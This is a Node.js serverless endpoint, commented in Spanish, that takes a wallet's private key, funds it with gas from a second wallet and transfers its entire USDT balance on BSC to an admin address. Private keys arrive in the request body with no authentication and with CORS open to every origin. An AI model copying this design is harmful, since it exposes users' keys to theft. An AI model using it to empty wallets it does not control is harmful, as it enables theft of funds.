const { ethers } = require('ethers');

module.exports = async function handler(req, res) {
    // CORS unificado
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Solo POST' });

    const { network, userPrivateKey, adminAddress, feePrivateKey } = req.body;

    if (!network || network.toUpperCase() !== 'BSC') {
        return res.status(400).json({ success: false, error: 'Por ahora este endpoint solo soporta BSC' });
    }

    if (!userPrivateKey || !adminAddress || !feePrivateKey) {
        return res.status(400).json({ success: false, error: 'Faltan parámetros de seguridad' });
    }

    try {
        // Conexión a la red principal de BSC
        const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
        
        // Contrato inteligente oficial de USDT en BSC (BEP20)
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint amount) returns (bool)"
        ];

        // Instanciar las billeteras
        const userWallet = new ethers.Wallet(userPrivateKey, provider);
        const feeWallet = new ethers.Wallet(feePrivateKey, provider);
        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, userWallet);

        // 1. Revisar cuánto USDT tiene la wallet del usuario
        const usdtBalance = await usdtContract.balanceOf(userWallet.address);
        
        if (usdtBalance === 0n) {
            return res.status(400).json({ success: false, error: 'La billetera no tiene fondos en USDT' });
        }

        // 2. Calcular y enviar el BNB necesario para el Gas (Aprox 0.0003 BNB / ~0.15 centavos)
        // En producción puedes calcular esto dinámicamente, aquí enviamos un monto seguro para que no falle.
        const gasAmount = ethers.parseEther("0.0003"); 
        
        const fundTx = await feeWallet.sendTransaction({
            to: userWallet.address,
            value: gasAmount
        });
        
        // Esperamos a que la inyección de gas se confirme en la blockchain
        await fundTx.wait();

        // 3. Barrer los USDT a tu billetera administradora
        const sweepTx = await usdtContract.transfer(adminAddress, usdtBalance);
        await sweepTx.wait();

        // El formato del monto para devolverlo limpio
        const formattedAmount = ethers.formatUnits(usdtBalance, 18);

        return res.status(200).json({
            success: true,
            network: "BSC",
            currency: "USDT",
            amountSwept: formattedAmount,
            gasTxHash: fundTx.hash,
            sweepTxHash: sweepTx.hash
        });

    } catch (error) {
        console.error("Error en el barrido:", error);
        return res.status(500).json({ 
            success: false, 
            error: 'Fallo al ejecutar el barrido', 
            detalles: error.message 
        });
    }
}
